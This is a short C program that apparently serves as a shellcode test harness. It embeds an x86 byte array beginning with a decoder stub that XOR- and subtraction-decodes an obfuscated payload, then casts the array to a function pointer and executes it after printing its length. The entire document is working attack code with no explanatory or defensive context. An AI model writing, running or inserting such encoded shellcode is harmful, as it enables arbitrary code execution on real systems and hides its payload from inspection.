#include<stdio.h>
#include<string.h>
unsigned char shellcode[] = \
"\xeb\x2c\x5e\x31\xc9\xb1\x19\x80\x3e\x83"
"\x7c\x0d\x80\x2e\x83\xf6\x16\x80\x36\xcf"
"\x80\x36\xaa\xeb\x10\x31\xd2\xb2\x83\x2a"
"\x16\x31\xdb\xb3\xff\x43\x66\x29\xd3\x88"
"\x1e\x46\xe2\xdb\xeb\x05\xe8\xcf\xff\xff"
"\xff\x2e\xdd\x4d\x75\x38\x38\x6c\x75\x75"
"\x38\x7b\x76\x77\x96\xfc\x4d\x96\xfb\x4c"
"\x96\xfe\xad\x14\xda\x9d";
int main(int argc, char* argv[])
{
	printf("\nShellcode 1 Length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;
	ret();
}

